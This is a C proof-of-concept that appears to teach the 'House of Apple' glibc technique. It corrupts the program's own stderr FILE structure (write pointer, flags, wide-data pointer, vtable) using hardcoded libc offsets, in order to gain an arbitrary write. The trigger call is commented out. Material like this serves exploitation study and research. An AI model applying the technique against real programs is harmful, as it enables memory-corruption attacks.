#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

int main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
    puts("[*] allocate a 0x100 chunk");
    size_t *p1 = malloc(0xf0);
    size_t *tmp = p1;
    size_t old_value = 0x1122334455667788;
    for (size_t i = 0; i < 0x100 / 8; i++)
    {
        p1[i] = old_value;
    }
    puts("===========================old value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================old value=======================");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t stderr_write_ptr_addr = puts_addr + 0x1997b8;
    printf("[*] stderr->_IO_write_ptr address: %p\n", (void *)stderr_write_ptr_addr);
    size_t stderr_flags2_addr = puts_addr + 0x199804;
    printf("[*] stderr->_flags2 address: %p\n", (void *)stderr_flags2_addr);
    size_t stderr_wide_data_addr = puts_addr + 0x199830;
    printf("[*] stderr->_wide_data address: %p\n", (void *)stderr_wide_data_addr);
    size_t sdterr_vtable_addr = puts_addr + 0x199868;
    printf("[*] stderr->vtable address: %p\n", (void *)sdterr_vtable_addr);
    size_t _IO_wstrn_jumps_addr = puts_addr + 0x194ed0;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);

    puts("[+] step 1: change stderr->_IO_write_ptr to -1");
    *(size_t *)stderr_write_ptr_addr = (size_t)-1;

    puts("[+] step 2: change stderr->_flags2 to 8");
    *(size_t *)stderr_flags2_addr = 8;

    puts("[+] step 3: replace stderr->_wide_data with the allocated chunk");
    *(size_t *)stderr_wide_data_addr = (size_t)p1;

    puts("[+] step 4: replace stderr->vtable with _IO_wstrn_jumps");
    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;

    puts("[+] step 5: call fcloseall and trigger house of apple");
//    fcloseall();
    tmp = p1;
    puts("===========================new value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================new value=======================");
    return 0;
}
